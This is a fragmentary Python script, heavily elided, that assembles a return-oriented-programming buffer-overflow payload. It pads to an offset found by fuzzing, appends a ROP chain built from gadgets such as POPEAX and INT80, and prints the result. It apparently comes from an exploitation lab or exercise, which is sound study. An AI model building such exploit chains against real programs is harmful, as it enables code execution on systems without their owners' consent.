...
from fuzzing import find_offset
...
def build_rop_chain(commands, gadgets):
    ...
    print("String addresses:", [hex(addr) for addr in string_addresses])
...
def main():
    ...
    # MOVISTACK, POPEDX, POPEAX, XOREAX, INCEAX, POPEBX, POPECX, INT80, STACK, DUMMY = extract_gadgets()
    ...
    p = b'A' * find_offset(vulnerable_program)
    rop_chain  = build_rop_chain(commands, gadgets)
    p += rop_chain
    print(p)
    # print(p)
    # x=b'A'*44
    # p += example_rop(gadgets)
    # print(x)
